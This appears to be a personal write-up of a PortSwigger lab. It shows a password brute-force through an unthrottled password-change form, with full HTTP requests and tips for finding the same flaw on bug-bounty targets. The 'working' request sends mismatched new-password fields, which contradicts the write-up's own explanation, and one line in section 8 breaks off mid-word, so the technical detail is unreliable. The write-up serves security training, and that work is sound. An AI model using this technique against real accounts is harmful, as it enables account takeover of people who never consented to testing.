# LAB: Password brute-force via password change

|                             |                                                                                                                                 |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| **Topic**                   | Authentication (Other mechanisms)                                                                                             |
| **Difficulty**              | Practitioner                                                                                                                 |
| **Date**                    | 2026-11-20                                                                                                                   |
| **Time**                    |         15                                                                                                                        |
| **Solved without solution** | yes                                                                                                                                 |
| **Link**                    | [lab-password-brute-force-via-password-change](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change) |

## 1. Objective

Bypass rate-limiting protections on primary authentication endpoints by leveraging a password change functionality flaw, allowing brute-force verification of current passwords to compromise the target user (`carlos`).

## 2. Surface

- Primary login endpoint (`/login`).
- Password change functionality accessible within the user profile/account area (`/change-password`).
- Target user account (`carlos`).

## 3. Hypothesis

If the password change logic verifies the user's "current password" without enforcing account lockout rules or rate limits—and returns distinct response behaviors for correct versus incorrect current password inputs—an attacker can brute-force a user's password directly through the password change form.

## 4. Payload that worked

Request:
```http
POST /my-account/change-password HTTP/2
Host: <host>.web-security-academy.net
Cookie: session=xxxx; session=yyyy
Content-Length: 85
Cache-Control: max-age=0
Sec-Ch-Ua: "Not:A-Brand";v="8", "Chromium";v="156"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Origin: https://<host>.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://<host>.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

username=carlos&current-password=112233&new-password-1=peterx&new-password-2=peter

POST /login HTTP/2
Host: <host>.web-security-academy.net
Cookie: session=sess
Content-Length: 31
Cache-Control: max-age=0
Sec-Ch-Ua: "Not:A-Brand";v="8", "Chromium";v="156"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Origin: https://<host>.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://<host>.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

username=carlos&password=112233
```
Response 
```http
HTTP/2 302 Found
Location: /my-account?id=carlos
Set-Cookie: session=sess; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

## 5. Why it works

The application's password change functionality enforces a strict validation order: it first validates that `new-password-1` and `new-password-2` match, and only then checks if `current-password` is correct. Crucially, account lockout mechanisms and rate-limiting counters enforced on `/login` are entirely missing from `/change-password`. Furthermore, the backend allows password verification attempts for any specified `username` parameter as long as a valid `session` cookie is provided in the request headers. By ensuring the new password fields match, an attacker can submit automated requests to `/change-password` using a dictionary of candidate passwords to discover the target user's (`carlos`) current password without triggering account lockouts.

## 6. What I tried that failed

- Attempted to run the brute-force attack without matching `new-password-1` and `new-password-2`, which resulted in generic validation errors before the application processed the `current-password` parameter.
- Attempted to send unauthenticated POST requests to `/change-password` without including a valid `session` cookie, which triggered immediate HTTP `302` redirects back to `/login` for all attempts.
- Initially tested the `ffuf` syntax against the target user without prior baseline testing, resulting in parsing errors due to multiple `-d` flags and incorrect HTTP methods (`GET` instead of `POST`).
- Rule extracted: When leveraging secondary endpoints (like password change forms) for credential validation, inspect early-exit validation rules (such as matching confirmation fields), verify session authentication requirements, and baseline automated tool responses against a controlled account (`wiener`) first.
## 7. In a real target (bounty translation)

- Where it shows up: Secondary authenticated or semi-authenticated endpoints (such as password change, email update, or 2FA management forms) that require re-authentication via "current password" but lack the rate-limiting middleware applied to the main `/login` route.
- Quick detection: Locate any form that accepts `current-password` alongside a username context. Automate sequential failed password requests on that endpoint to determine if rate limits/lockouts are triggered after 3-5 failed attempts.
- Impact: Full account takeover by bypassing standard login lockout controls to brute-force candidate passwords via alternate re-authentication vectors.
- In the report: Highlight the asymmetry between login endpoint rate limiting and password change endpoint rate limiting, demonstrating how an attacker can verify valid user credentials without triggering lockouts.

## 8. Bypass / variants noticed

- Testing field validation order in secondary forms (e.g., verifying whether input matching checks precede backend credential verification).
- Reusing valid authenticated session cookies from low-privileged accounts to target arbitrary higher-privileged user accounts (`carlos`) across un-bound identity parameters (`username=carlos`).
- Filtering response differences based on redirection behaviors, response lengths (`-fs`), or specific error messaging ren

## 9. Takeaway

Rate limiting, IP throttling, and account lockout mechanisms must be enforced consistently across all endpoints that accept user credentials for validation—including password change forms, email updates, and API re-authentication endpoints—rather than solely on the primary login page.
